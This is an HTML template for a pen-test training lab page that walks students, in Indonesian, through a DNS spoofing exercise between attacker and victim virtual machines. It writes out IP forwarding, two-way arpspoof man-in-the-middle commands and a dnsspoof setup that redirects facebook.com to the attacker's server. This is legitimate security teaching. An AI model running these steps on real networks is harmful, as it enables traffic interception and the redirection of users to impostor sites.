{% extends "layout/base.html" %}

{% block title %}DNS Spoofing Simulation - Virtual Pen Test Lab{% endblock %}

{% block content %}
<div class="page-header">
    <div class="d-flex justify-content-between align-items-center">
        <div>
            <h1 class="page-title">DNS Spoofing Simulation</h1>
            <p class="page-subtitle">Simulasi serangan DNS Spoofing untuk membelokkan traffic korban.</p>
        </div>
        <div class="vm-status status-active">
            Lab Active
        </div>
    </div>
</div>

<div class="lab-layout">
    <!-- LEFT COLUMN: STEPS -->
    <aside class="lab-steps">
        <h3 class="card-title">Guide Instructions</h3>
        <div class="steps-container">

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step1')">
                    1. Start Virtual Machines
                </button>
                <div id="step1" class="step-content open">
                    <p>Nyalakan VM Attacker dan Victim. Pastikan keduanya berada dalam satu jaringan internal yang sama.
                    </p>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step2')">
                    2. Network Check
                </button>
                <div id="step2" class="step-content">
                    <p>Cek IP address dan konektivitas (ping):</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ip a</code>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ping &lt;victim_ip&gt;</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step3')">
                    3. Enable IP Forwarding
                </button>
                <div id="step3" class="step-content">
                    <p>Aktifkan forwarding agar traffic tetap bisa lewat (agar korban tidak curiga putus koneksi):</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo 1 > /proc/sys/net/ipv4/ip_forward</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step4')">
                    4. ARP Spoofing
                </button>
                <div id="step4" class="step-content">
                    <p>Lakukan ARP poisoning (Man-in-the-Middle) dua arah:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;victim_ip&gt; &lt;gateway_ip&gt;</code>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;gateway_ip&gt; &lt;victim_ip&gt;</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step5')">
                    5. DNS Spoofing
                </button>
                <div id="step5" class="step-content">
                    <p>Buat file <code>dns.txt</code> berisi mapping domain palsu:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo "facebook.com 192.168.56.100" > dns.txt</code>
                    <p class="mt-4">Jalankan dnsspoof:</p>
                    <code
                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">dnsspoof -i eth0 -f dns.txt</code>
                </div>
            </div>

            <div class="step-item">
                <button class="step-title" onclick="toggleStep('step6')">
                    6. Verification
                </button>
                <div id="step6" class="step-content">
                    <p>Buka browser di Victim VM dan akses <code>facebook.com</code>. Halaman seharusnya mengarah ke
                        server attacker (192.168.56.100).</p>
                </div>
            </div>

        </div>
    </aside>

    <!-- RIGHT COLUMN: VM PREVIEW -->
    <main class="lab-main">
        <div class="vm-grid">
            <!-- Attacker Box -->
            <div class="vm-card">
                <h3 class="card-title">Attacker VM (Kali Linux)</h3>
                <div id="attacker-vm-container" class="vm-preview"
                    style="padding: 0; overflow: hidden; height: 600px; display: flex; align-items: center; justify-content: center; background: #f8f9fa;">
                    <div style="text-align: center;">
                        <p style="margin-bottom: 1rem; color: #6c757d;">VM is ready</p>
                    </div>
                </div>
                <div class="actions mt-3 text-center">
                    <button class="btn btn-primary"
                        onclick="startVM('attacker-vm-container', '{{ attacker_url }}', 'dns-spoofing', 'attacker')">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                            style="margin-right:8px;">
                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
                        </svg>
                        Start VM
                    </button>
                </div>
            </div>

            <!-- Victim Box -->
            <div class="vm-card">
                <h3 class="card-title">Victim VM (Windows/Linux)</h3>
                <div id="target-vm-container" class="vm-preview"
                    style="padding: 0; overflow: hidden; height: 600px; display: flex; align-items: center; justify-content: center; background: #f8f9fa;">
                    <div style="text-align: center;">
                        <p style="margin-bottom: 1rem; color: #6c757d;">VM is ready</p>
                    </div>
                </div>
                <div class="actions mt-3 text-center" style="display: flex; gap: 8px; justify-content: center;">
                    <button class="btn btn-primary"
                        onclick="startVM('target-vm-container', '{{ target_url }}', 'dns-spoofing')">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                            style="margin-right:8px;">
                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
                        </svg>
                        Start VM
                    </button>
                    <button class="btn btn-warning" onclick="resetVM('dns-spoofing')">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                            style="margin-right:8px;">
                            <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
                            <path d="M3 3v5h5"></path>
                        </svg>
                        Reset VM
                    </button>
                </div>
            </div>
        </div>

    </main>
</div>
{% endblock %}